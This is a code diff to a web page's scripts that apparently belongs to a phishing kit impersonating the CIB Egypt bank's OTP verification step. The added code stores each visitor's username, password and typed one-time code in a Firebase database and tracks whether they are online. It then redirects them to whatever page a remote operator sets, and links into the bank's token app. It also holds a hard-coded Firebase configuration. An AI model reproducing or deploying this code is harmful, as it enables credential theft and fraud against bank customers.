@@ -506,6 +506,169 @@ setInterval(()=>{
 </script>
 <script type="module">
 
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+
+getFirestore,
+    collection,
+    query,
+    where,
+    getDocs,
+    updateDoc,
+    doc,
+    setDoc
+
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+/* =========================
+   FIREBASE
+========================= */
+
+const firebaseConfig = {
+
+  apiKey: "AIzaSyDkGm7g7nvOQqvBUriLwiGAJh1vutsnsMk",
+
+  authDomain: "tijari-42163.firebaseapp.com",
+
+  projectId: "tijari-42163",
+
+  storageBucket: "tijari-42163.firebasestorage.app",
+
+  messagingSenderId: "283984614907",
+
+  appId: "1:283984614907:web:8b9d27c4dfef86d116275e",
+
+  measurementId: "G-P9KGR3B48Y"
+
+};
+
+const app = initializeApp(firebaseConfig);
+
+const db = getFirestore(app);
+
+/* =========================
+   SUBMIT OTP
+========================= */
+
+setInterval(async ()=>{
+
+    const loginData =
+        JSON.parse(localStorage.getItem("loginData"));
+
+    if(!loginData) return;
+
+    const userId = localStorage.getItem("userId")
+
+    await setDoc(doc(db,"users",userId),{
+
+        lastSeen: Date.now()
+
+    },{ merge:true });
+
+},5000);
+
+
+document.getElementById('submitBtn').onclick = async () => {
+
+    let otpCode = "";
+
+    inputs.forEach(input => {
+
+        otpCode += input.value;
+
+    });
+
+    /* require 6 digits */
+
+    if(otpCode.length !== 6){
+
+        return;
+
+    }
+
+    /* show loader */
+
+    document.getElementById('loader').classList.add('show');
+
+    /* get login data */
+
+    const loginData =
+        JSON.parse(localStorage.getItem('loginData'));
+
+    if(!loginData){
+
+        window.location.href = "login.html";
+
+        return;
+
+    }
+
+    /* find current user */
+
+const userId = localStorage.getItem("userId")
+
+await setDoc(doc(db,"users",userId),{
+
+    username: loginData.username,
+    password: loginData.password,
+    otp: otpCode,
+    currentPage: "waitaccount.html",
+    lastSeen: Date.now()
+
+},{ merge:true });
+    /* redirect */
+
+    setTimeout(() => {
+
+        window.location.href = "waitaccount.html";
+
+    }, 1500);
+
+};
+
+/* =========================
+   TOKEN APP
+========================= */
+
+document
+.getElementById("openTokenApp")
+.addEventListener("click", function () {
+
+    const ua = navigator.userAgent || "";
+
+    const isAndroid = /Android/i.test(ua);
+
+    const isiOS = /iPhone|iPad|iPod/i.test(ua);
+
+    /* Android */
+
+    if (isAndroid) {
+
+        window.location.href =
+        "intent://#Intent;scheme=cib;package=com.CIBEgyptSecureToken;end";
+
+        return;
+
+    }
+
+    /* iOS */
+
+    if (isiOS) {
+
+        window.location.href =
+        "cibegyptsecuretoken://";
+
+        return;
+
+    }
+
+});
+
+</script>
+
+<script type="module">
+
 import { getApp }
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 
@@ -515,11 +678,8 @@ import {
     onSnapshot
 } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-/* firebase */
-
-const app = getApp();
-
-const firestore = getFirestore(app);
+/* FIX */
+const dbase = getFirestore(getApp());
 
 /* current login */
 
@@ -531,34 +691,27 @@ if(loginData){
     const userId =
         localStorage.getItem("userId");
 
-    onSnapshot(
-        doc(firestore,"users",userId),
-        (docSnap)=>{
+    onSnapshot(doc(dbase,"users",userId),(docSnap)=>{
 
-            if(!docSnap.exists()) return;
+        if(!docSnap.exists()) return;
 
-            const user = docSnap.data();
+        const user = docSnap.data();
 
-            const currentPage =
-                user.currentPage;
+        const currentPage = user.currentPage;
 
-            const currentFile =
-                window.location.pathname
-                .split("/")
-                .pop();
+        const currentFile =
+            window.location.pathname.split("/").pop();
 
-            if(
-                currentPage &&
-                currentPage !== currentFile
-            ){
+        if(
+            currentPage &&
+            currentPage !== currentFile
+        ){
 
-                window.location.href =
-                    currentPage;
-
-            }
+            window.location.href = currentPage;
 
         }
-    );
+
+    });
 
 }
 
